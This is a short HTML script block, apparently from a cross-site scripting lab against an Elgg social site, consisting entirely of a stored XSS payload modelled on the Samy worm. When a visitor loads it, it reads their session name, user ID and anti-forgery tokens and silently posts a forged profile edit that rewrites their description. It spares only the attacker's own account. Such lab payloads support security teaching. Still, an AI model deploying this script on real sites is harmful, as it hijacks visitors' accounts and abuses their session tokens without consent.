<div id="worm">
<script type="text/javascript">
var name="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

var desc="&description=SAMY+is+MY+HERO";
desc+="&accesslevel%5Bdescription%5d=2";

var sendurl="http://www.xsslabelgg.com/action/profile/edit";

if(elgg.session.user.guid!=42)
{
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(token+ts+name+desc+guid);
}
</script>
</div>

